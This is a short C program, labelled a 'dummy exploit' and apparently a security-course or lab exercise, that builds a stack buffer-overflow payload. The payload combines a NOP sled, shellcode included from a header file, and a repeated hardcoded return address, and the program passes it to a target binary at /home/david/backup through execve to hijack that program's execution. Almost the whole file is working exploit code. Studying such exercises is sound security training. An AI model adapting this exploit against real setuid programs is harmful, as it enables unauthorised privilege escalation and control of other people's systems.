	/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/home/david/backup"

#define NOP "\x90"

int main(void)
{
	char *args[4];
	char *env[1];

	//char bufferAddrOriginal[] = "\xff\xbf\xdc\xe8";
	//char bufferAddrAfterDir[] = "\xff\xbf\xdd\x10";
	char bufferAddrAfterRev[] = "\x10\xdd\xbf\xff";
	char payload[208];

	int i;
	for(i=0; i<52; i++) {
		strcat (payload, bufferAddrAfterRev);
	}
	for(i=0; i<17; i++) {
		payload[i] = '\x90';
	}
	for (i = 0; i < strlen(shellcode); i++) {
		payload[i+17] = shellcode[i];
	}

	args[0] = TARGET; args[1] = "backup"; 
	args[2] = payload; args[3] = NULL;
	env[0] = NULL;

	if (execve(TARGET, args, env) < 0)
	fprintf(stderr, "execve failed.\n");

	exit(0);
}